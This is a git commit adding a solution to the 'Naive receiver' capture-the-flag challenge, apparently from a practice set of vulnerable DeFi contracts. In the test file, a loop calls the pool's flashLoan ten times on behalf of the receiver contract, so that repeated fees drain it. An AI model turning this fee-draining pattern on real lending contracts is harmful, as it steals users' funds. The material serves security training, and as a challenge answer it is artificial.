4557508ad9a19637cf61de420d4a141acc7a78e1
loicttn - pwnh4 <loic.titren@hotmail.fr>
2022-01-13 23:29:33 +0100

    solved naive receiver

--- test/naive-receiver/naive-receiver.challenge.js
+++ test/naive-receiver/naive-receiver.challenge.js
@@ -31,6 +31,10 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        this.pool.connect(attacker);
+        for (let i = 0; i < 10; i += 1) {
+            await this.pool.flashLoan(this.receiver.address, 1);
+        }
     });
 
     after(async function () {
